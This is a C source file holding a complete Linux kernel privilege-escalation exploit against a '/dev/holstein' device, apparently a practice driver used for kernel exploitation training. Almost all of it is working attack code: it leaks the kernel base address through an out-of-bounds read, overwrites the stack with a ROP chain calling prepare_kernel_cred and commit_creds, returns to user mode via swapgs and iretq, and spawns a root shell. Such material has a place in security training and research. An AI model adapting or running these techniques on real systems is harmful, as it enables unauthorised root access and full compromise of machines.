#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

#define is_error(c, s)          \
    {                           \
        if ((c)) {              \
            perror((s));        \
            exit(EXIT_FAILURE); \
        }                       \
    }


unsigned long kbase = 0x0;

#define prepare_kernel_cred 0x08d030
#define commit_creds 0x08cd90
#define rop_pop_rdi 0x4352ec
#define mov_rdi_rax_rep_movsq_rdi_rsi_ret 0xbcf27b
#define iretq 0x913ca2
#define swapgs 0xc00f58


// #define prepare_kernel_cred 0xffffffff8108d030
// #define commit_creds 0xffffffff8108cd90
// #define rop_pop_rdi 0xffffffff814352ec
// #define mov_rdi_rax_rep_movsq_rdi_rsi_ret 0xffffffff81bcf27b
// #define iretq 0xffffffff81913ca2
// #define swapgs 0xffffffff81c00f58

/*

0xffffffff81bcf27b: mov rdi, rax; rep movsq [rdi], [rsi]; ret;

*/

/*

gef> x/16i 0xffffffff814352eb
   0xffffffff814352eb <__sw_hweight64+91>:      pop    rdx
   0xffffffff814352ec <__sw_hweight64+92>:      pop    rdi
   0xffffffff814352ed <__sw_hweight64+93>:      ret
*/

/* ??? */

unsigned long user_cs, user_ss, user_rsp, user_rflags;


/*




static void lpe() 
{
  commit_creds(prepare_kernel_cred(NULL));
  restore_state();
}

*/

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };

    execve("/bin/sh", argv, envp);
}

static void save_state() {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}


unsigned long leak_kbase(int fd)
{
    unsigned long kbase = 0x0;
    unsigned long do_syscall_64 = 0x0;
    char buf[0x500] = {0};
    read(fd, buf, 0x500);

    do_syscall_64 = *(unsigned long*)(&buf[0x470]);

    kbase = do_syscall_64 - 0xBCE6DB;
    printf("do_syscall_64:%lx\n", do_syscall_64);
    printf("kbase:%lx\n", kbase);
    return kbase;
}


int main() {

  

    signal(SIGSEGV, win);
    int fd;

    char buf[0x500];

    save_state();

    fd = open("/dev/holstein", O_RDWR);
    is_error(fd == -1, "open() failed");

    kbase = leak_kbase(fd);

    memset(buf, 'a', 0x400);

    unsigned long *chain = (unsigned long *)&buf[0x400];
    *chain++ = (unsigned long)(kbase + rop_pop_rdi);
    *chain++ = 0;
    *chain++ = (unsigned long)(kbase + prepare_kernel_cred);
    *chain++ = (unsigned long)(kbase + mov_rdi_rax_rep_movsq_rdi_rsi_ret);
    *chain++ = (unsigned long)(kbase + commit_creds);

    *chain++ = (unsigned long)(kbase + swapgs);
    *chain++ =(unsigned long)(kbase + iretq);

    *chain++ = (unsigned long)&win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    write(fd, buf, (unsigned long)chain - (unsigned long)buf);
  //  write(fd, buf, 0x500);

/*

static void restore_state() {
    asm("swapgs\n"
        "movq %0, 0x20(%%rsp)\n"
        "movq %1, 0x18(%%rsp)\n"
        "movq %2, 0x10(%%rsp)\n"
        "movq %3, 0x08(%%rsp)\n"
        "movq %4, 0x00(%%rsp)\n"
        "iretq\n"
        :
        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
          "r"(win));
}

*/


    return 0;
}